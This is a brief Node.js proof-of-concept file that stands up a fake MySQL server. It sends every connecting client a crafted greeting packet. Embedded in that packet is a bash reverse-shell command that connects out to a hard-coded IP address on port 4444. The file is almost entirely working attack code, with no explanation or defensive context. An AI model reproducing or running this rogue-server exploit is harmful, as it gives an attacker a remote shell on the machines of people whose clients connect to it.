// poc_server.js
const net = require("net");

const PORT = 3306;
const shell = "bash -c 'bash -i >& /dev/tcp/167.71.203.2/4444 0>&1'";

const server = net.createServer(socket => {
  console.log("[+] Got a connection from", socket.remoteAddress);

  const response = Buffer.from([
    0x0a,                                  // fake MySQL protocol version
    ...Buffer.from(shell),                // inject payload
    0x00
  ]);

  socket.write(response);
  socket.end();
});

server.listen(PORT, () => {
  console.log(`[+] Fake MySQL server running on port ${PORT}`);
});
